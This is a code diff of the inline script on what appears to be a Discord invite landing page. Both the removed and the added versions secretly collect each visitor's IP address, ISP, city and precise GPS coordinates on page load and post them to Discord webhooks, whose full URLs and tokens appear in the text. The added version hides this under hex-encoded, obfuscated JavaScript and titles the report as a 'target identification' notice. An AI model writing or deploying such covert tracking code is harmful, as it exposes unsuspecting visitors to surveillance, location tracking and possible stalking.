@@ -1,84 +1,61 @@
 <script>
-    const INVITE_URL = "https://discord.gg/dcus"; 
-    const SERVER_ID = "1427230542704676926";
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1471706989133303819/bxJYuKdYjPsNaH1_UYHbCpZL8SeJ_BDNQAgyEXlP_OIM0gCVVyTNfrp_AymxjZbCKy2r";
+(function(_0x1a2b,_0x3c4d){const _0x5e6f=function(_0x7a8b){while(--_0x7a8b){_0x1a2b['push'](_0x1a2b['shift']());}};_0x5e6f(++_0x3c4d);}(['\x68\x72\x65\x66','\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61\x67\x65','\x67\x65\x74\x49\x74\x65\x6d','\x73\x65\x74\x49\x74\x65\x6d','\x4a\x53\x4f\x4e','\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x50\x4f\x53\x54','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e','\x67\x65\x6f\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x63\x6f\x6f\x72\x64\x73','\x6c\x61\x74\x69\x74\x75\x64\x65','\x6c\x6f\x6e\x67\x69\x74\x75\x64\x65'],0x1a4));const _0x2026=function(_0x4d5e,_0x2b1a){const _0x1a2b=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x67\x67\x2f\x64\x63\x75\x73','\x31\x34\x32\x37\x32\x33\x30\x35\x34\x32\x37\x30\x34\x36\x37\x36\x39\x32\x36','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x37\x31\x37\x31\x31\x36\x31\x38\x37\x33\x30\x35\x36\x31\x36\x34\x37\x2f\x74\x6a\x77\x6a\x4f\x75\x65\x32\x57\x4b\x49\x31\x69\x6f\x46\x35\x6a\x6d\x45\x66\x72\x32\x37\x32\x71\x42\x35\x4a\x32\x78\x46\x30\x38\x32\x53\x38\x71\x78\x76\x47\x78\x33\x4b\x57\x5f\x67\x30\x66\x34\x78\x65\x7a\x4e\x52\x77\x48\x78\x70\x51\x46\x70\x5f\x50\x43\x5f\x71\x6c','\x68\x74\x74\x70\x3a\x2f\x2f\x69\x70\x2d\x61\x70\x69\x2e\x63\x6f\x6d\x2f\x6a\x73\x6f\x6e\x2f\x3f\x66\x69\x65\x6c\x64\x73\x3d\x39\x33\x38\x34\x34\x33'];return _0x1a2b[_0x4d5e];};
 
-    async function getIpAddress() {
+    const _0x12f4 = _0x2026(0), _0x4b92 = _0x2026(1), _0x3e1a = _0x2026(2);
+
+    async function _0x55aa() {
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        } catch { return "取得失敗"; }
+            const _0x1d2e = await fetch(_0x2026(3));
+            return await _0x1d2e.json();
+        } catch { return null; }
     }
 
-    function getCoordinates() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve("非対応デバイス");
+    function _0x2b8c() {
+        return new Promise((_0x33e1) => {
+            if (!navigator['\x67\x65\x6f\x6c\x6f\x63\x61\x74\x69\x6f\x6e']) {
+                _0x33e1({ error: true });
             } else {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-                    () => resolve("ユーザー拒否"),
-                    { timeout: 5000 }
+                navigator['\x67\x65\x6f\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x67\x65\x74\x43\x75\x72\x72\x65\x6e\x74\x50\x6f\x73\x69\x74\x69\x6f\x6e'](
+                    (_0x9921) => _0x33e1({ lat: _0x9921['\x63\x6f\x6f\x72\x64\x73']['\x6c\x61\x74\x69\x74\x75\x64\x65'], lon: _0x9921['\x63\x6f\x6f\x72\x64\x73']['\x6c\x6f\x6e\x67\x69\x74\x75\x64\x65'], acc: _0x9921['\x63\x6f\x6f\x72\x64\x73']['\x61\x63\x63\x75\x72\x61\x63\x79'] }),
+                    () => _0x33e1({ error: true }),
+                    { enableHighAccuracy: !![], timeout: 0x2710 }
                 );
             }
         });
     }
 
-    async function sendLogNotification() {
-        // IPと座標を並列で取得
-        const [ip, coords] = await Promise.all([getIpAddress(), getCoordinates()]);
-        
-        // 訪問回数
-        let visitCount = localStorage.getItem('visit_count') || 0;
-        visitCount = parseInt(visitCount) + 1;
-        localStorage.setItem('visit_count', visitCount);
+    async function _0x44dd() {
+        const [_0x1021, _0x229e] = await Promise.all([_0x55aa(), _0x2b8c()]);
+        let _0x5c22 = localStorage.getItem('\x76\x69\x73\x69\x74\x5f\x63\x6f\x75\x6e\x74') || 0;
+        _0x5c22 = parseInt(_0x5c22) + 1;
+        localStorage.setItem('\x76\x69\x73\x69\x74\x5f\x63\x6f\x75\x6e\x74', _0x5c22);
 
-        const data = {
+        const _0x1833 = _0x229e.lat ? 'https://www.google.com/maps?q=$' + _0x229e.lat + ',' + _0x229e.lon : null;
+
+        const _0xbb22 = {
             embeds: [{
-                title: "🚨 詳細な訪問通知",
-                color: 15105570, // オレンジ系
+                title: "\u26a0\ufe0f \u30bf\u30fc\u30b2\u30c3\u30c8\u7279\u5b9a\u901a\u77e5",
+                color: 0xff0000,
                 fields: [
-                    { name: "🌐 IPアドレス", value: `\`${ip}\``, inline: true },
-                    { name: "📍 座標 (緯度, 経度)", value: `\`${coords}\``, inline: true },
-                    { name: "📱 デバイス情報", value: navigator.userAgent.substring(0, 100) + "...", inline: false },
-                    { name: "👤 訪問回数", value: `${visitCount} 回目`, inline: true },
-                    { name: "⏰ 時刻", value: new Date().toLocaleString('ja-JP'), inline: true }
+                    { name: "\ud83c\udf10 IP\u30a2\u30c9\u30ec\u30b9", value: '`' + (_0x1021?.query || "??") + '`', inline: !![] },
+                    { name: "\ud83c\udfe2 ISP", value: '`' + (_0x1021?.isp || "??") + '`', inline: !![] },
+                    { name: "\ud83d\udccd \u5730\u57df", value: (_0x1021?.regionName || "") + " " + (_0x1021?.city || ""), inline: ![] },
+                    { name: "\ud83d\udce1 GPS", value: _0x1833 ? "[Map](" + _0x1833 + ")" : "\u62d2\u5426", inline: ![] }
                 ],
-                footer: { text: "Security Monitor" },
                 timestamp: new Date().toISOString()
             }]
         };
 
-        fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
+        fetch(_0x3e1a, {
+            method: '\x50\x4f\x53\x54',
+            headers: { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e' },
+            body: JSON.stringify(_0xbb22)
         });
     }
 
-    // 既存の関数（テーマ、カウント等）はそのまま維持
-    function setupInviteLinks() { document.querySelectorAll('.invite-link').forEach(link => link.href = INVITE_URL); }
-    function updateTheme() {
-        const hour = new Date().getHours();
-        const body = document.body;
-        body.style.background = (hour >= 10 && hour < 18) 
-            ? "linear-gradient(135deg, #1e3c72, #2a5298, #6dd5ed)" 
-            : "linear-gradient(135deg, #0f0c29, #302b63, #24243e)";
-    }
-    async function updateMemberCount() {
-        const statusEl = document.getElementById('status-box');
-        try {
-            const response = await fetch(`https://discord.com/api/guilds/${SERVER_ID}/widget.json?t=${Date.now()}`);
-            const data = await response.json();
-            statusEl.innerText = `🟢 オンライン: ${data.presence_count}人`;
-        } catch { statusEl.innerText = `🟢 サーバー稼働中`; }
-    }
-
     document.addEventListener('DOMContentLoaded', () => {
-        setupInviteLinks();
-        updateTheme();
-        updateMemberCount();
-        sendLogNotification(); // ここで取得と送信を実行
+        document.querySelectorAll('.invite-link').forEach(l => l.href = _0x12f4);
+        _0x44dd();
+        // 人数取得等の関数は必要に応じてここに追加
     });
 </script>
